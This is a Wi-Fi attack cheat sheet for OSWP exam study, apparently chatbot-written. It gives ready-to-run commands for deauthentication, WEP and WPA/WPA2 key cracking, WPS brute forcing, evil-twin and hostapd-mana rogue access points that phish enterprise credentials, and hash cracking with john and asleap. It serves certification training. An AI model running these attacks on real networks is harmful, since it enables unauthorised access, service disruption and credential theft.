# Chapter 0.6 - Another Quick Cheat Sheet

Here's the revised cheat sheet for Wi-Fi hacking, including **WPA2/WPA3 Enterprise attacks using manual methods** like **`hostapd-mana`** instead of automated tools.

---

### **Wi-Fi Hacking Cheat Sheet (Manual Approach)**

---

#### **1. Wireless Standards and Frequencies**
- **802.11a**: 5 GHz, 54 Mbps
- **802.11b**: 2.4 GHz, 11 Mbps
- **802.11g**: 2.4 GHz, 54 Mbps
- **802.11n**: 2.4/5 GHz, up to 600 Mbps
- **802.11ac**: 5 GHz, up to 1.3 Gbps
- **802.11ax (Wi-Fi 6)**: 2.4/5 GHz, 10+ Gbps

#### **2. Wi-Fi Encryption Types**
- **WEP**: Vulnerable, uses RC4, 24-bit IV (easily cracked using tools like `aircrack-ng`)
- **WPA**: TKIP (Temporal Key Integrity Protocol), RC4 (deprecated)
- **WPA2**: CCMP/AES encryption, commonly used but vulnerable to KRACK
- **WPA3**: Uses SAE (Simultaneous Authentication of Equals), more secure but requires advanced attacks
- **WPA2/WPA3 Enterprise**: EAP (Extensible Authentication Protocol) with a RADIUS server for user authentication

---

#### **3. Tools for Wireless Hacking**

- **`airmon-ng`**: Enable/disable monitor mode
    - Start: `airmon-ng start wlan0`
    - Stop: `airmon-ng stop wlan0mon`
  
- **`airodump-ng`**: Capture and monitor packets
    - Basic command: `airodump-ng wlan0mon`
    - Channel specific: `airodump-ng -c <channel> wlan0mon`
  
- **`aireplay-ng`**: Deauthenticate or inject packets
    - Deauth: `aireplay-ng -0 10 -a <AP MAC> wlan0mon`
    - Fake auth: `aireplay-ng -1 0 -a <AP MAC> -h <your MAC> wlan0mon`
  
- **`aircrack-ng`**: Crack captured packets
    - Crack WEP: `aircrack-ng <capture file>.cap`
    - Crack WPA/WPA2: `aircrack-ng -w <wordlist> <capture file>.cap`

- **`hostapd-mana`**: A specialized version of `hostapd` for man-in-the-middle attacks on WPA2/WPA3 Enterprise.

---

#### **4. Attacking WEP**

- **Capture the handshake:**
    - `airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon`
  
- **Fake Authentication:**
    - `aireplay-ng -1 0 -a <BSSID> -h <your MAC> wlan0mon`
  
- **ARP Request Replay (inject packets to speed up cracking):**
    - `aireplay-ng -3 -b <BSSID> wlan0mon`
  
- **Crack WEP Key:**
    - `aircrack-ng <output file>.cap`

---

#### **5. Attacking WPA/WPA2 (PSK)**

- **Capture WPA Handshake:**
    - `airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon`
  
- **Deauthenticate a client to force reauthentication:**
    - `aireplay-ng -0 5 -a <AP MAC> -c <Client MAC> wlan0mon`
  
- **Crack WPA/WPA2 using a wordlist:**
    - `aircrack-ng -w <wordlist> <output file>.cap`
    - Recommended wordlist: `rockyou.txt`

---

#### **6. WPS Attack (Manual Approach)**

- **Find WPS-enabled APs** using `wash`:
    - `wash -i wlan0mon`
  
- **Attempt to brute force the WPS PIN manually with `reaver` or manually crafted scripts**.

---

#### **7. Hidden SSID Discovery**

- **Capture Hidden SSID:**
    - `airodump-ng -c <channel> --bssid <BSSID> -w <output file> wlan0mon`
  
- **Deauth Clients to reveal SSID:**
    - `aireplay-ng -0 10 -a <BSSID> wlan0mon`

---

#### **8. Evil Twin Attack (Manual Setup)**

- **Set up Rogue AP with `hostapd`:**
    - Create a configuration file for `hostapd` to mimic the target AP's SSID and encryption settings.
    - Start `hostapd`:  
      ```bash
      hostapd /path/to/hostapd.conf
      ```

- **Capture client traffic and credentials manually using a packet capture tool** like `tcpdump` or `wireshark`.

---

#### **9. WPA2/WPA3 Enterprise Attacks (Manual)**

- **Rogue AP Attack using `hostapd-mana`** (WPA2 Enterprise):
    - **Install `hostapd-mana`:**
      ```bash
      apt-get install hostapd-mana
      ```
    - **Configure `hostapd-mana`:**
      Edit the configuration file (`hostapd-mana.conf`) to match the SSID of the target network and set up the rogue AP to capture enterprise credentials.
    - **Run `hostapd-mana`:**
      ```bash
      hostapd-mana /path/to/hostapd-mana.conf
      ```
    - **Monitor captured credentials** by logging the attempts made by clients to authenticate.

- **Manual EAP Phishing Attack using `hostapd-mana`:**
    - **Modify `hostapd-mana.conf`** to enable credential phishing.
    - Set `eap_user_file` and `eap_server_cert` to intercept and capture PEAP/MSCHAPv2 credentials.
    - Launch the rogue AP and capture credentials:
      ```bash
      hostapd-mana /path/to/hostapd-mana.conf
      ```
    - **Captured PEAP/MSCHAPv2 credentials** can be brute-forced using tools like `john`:
      ```bash
      john --wordlist=<wordlist> captured_hashes.txt
      ```

---

#### **10. Manual EAP Credential Cracking (PEAP/MSCHAPv2)**

- **Crack LEAP Credentials with `asleap`:**
    - After capturing the challenge and response from the LEAP authentication, use:
      ```bash
      asleap -C <challenge> -R <response> -W <wordlist>
      ```

- **Crack PEAP/MSCHAPv2 Credentials with `john`**:
    - Once you capture the EAP-MSCHAPv2 handshake:
      ```bash
      john --wordlist=<wordlist> eap-hashes.txt
      ```

---

#### **11. Miscellaneous Commands**

- **Change MAC Address (if needed):**
    - `ifconfig wlan0 down`
    - `macchanger -r wlan0`
    - `ifconfig wlan0 up`
  
- **Check for Network Interfaces:**
    - `ifconfig` or `iwconfig`
  
- **Switch to Monitor Mode:**
    - `airmon-ng start wlan0`

---

#### **12. Practice**

- **Set up your own test environment using a router**: Configure WPA2 Enterprise with a RADIUS server to simulate realistic attacks and practice safely.

- **Use `Wireshark` to analyze captured traffic**: Understanding the structure of EAP handshakes and PEAP/MSCHAPv2 exchanges will help during credential interception.

---

### **Tips for the OSWP Exam**
- **Understand each step of manual attacks**: From setting up a rogue AP to intercepting and cracking credentials, focus on the underlying protocols.
- **Capture WPA2 Enterprise credentials**: Practice using `hostapd-mana` to set up rogue APs and capture PEAP/MSCHAPv2 handshakes.
- **Crack captured hashes manually** using tools like `john` or `asleap`.

Good luck with your OSWP exam preparation! Let me know if you need further clarifications or details.